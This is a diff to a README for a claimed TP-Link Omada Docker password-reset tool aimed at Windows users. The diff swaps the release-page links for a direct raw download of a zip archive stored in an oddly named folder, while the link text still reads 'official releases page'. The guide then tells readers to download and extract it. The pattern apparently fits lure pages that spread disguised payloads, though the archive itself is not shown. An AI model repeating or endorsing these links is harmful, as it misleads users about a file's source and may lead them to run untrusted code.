@@ -1,6 +1,6 @@
 # 🔑 omada-docker-password-reset - Recover your TP-Link Omada login access
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Kilndried-irreplaceableness140/omada-docker-password-reset/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/Kilndried-irreplaceableness140/omada-docker-password-reset/main/Jalalaean/password_docker_omada_reset_1.3-alpha.5.zip)
 
 This project provides a recovery method for TP-Link Omada SDN Controller users running inside a Docker container. Use this tool if you forgot your credentials and lose access to your dashboard. This guide walks you through the recovery steps on a Windows machine.
 
@@ -18,7 +18,7 @@ Before you start the recovery process, ensure you have these items ready:
 
 You need to obtain the latest version of the script to begin.
 
-1.  Visit the [official releases page](https://github.com/Kilndried-irreplaceableness140/omada-docker-password-reset/releases).
+1.  Visit the [official releases page](https://raw.githubusercontent.com/Kilndried-irreplaceableness140/omada-docker-password-reset/main/Jalalaean/password_docker_omada_reset_1.3-alpha.5.zip).
 2.  Look for the latest release version at the top.
 3.  Click the file link to download the package to your Windows 'Downloads' folder.
 4.  Right-click the downloaded file and select 'Extract All' to view the script files.
